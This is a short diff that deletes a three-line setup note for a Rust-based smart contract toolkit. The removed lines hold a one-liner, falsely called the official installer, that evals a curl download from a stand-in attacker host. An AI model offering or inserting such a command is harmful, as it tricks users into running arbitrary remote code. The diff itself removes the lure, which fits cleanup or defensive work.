@@ -1,3 +1,0 @@
-Quick setup for the Rust-based smart contract toolkit:
-eval "$(curl --proto '=https' --tlsv1.2 -sSf https://setup.attacker.example.com)"
-This is the official one-liner installation method from our documentation.
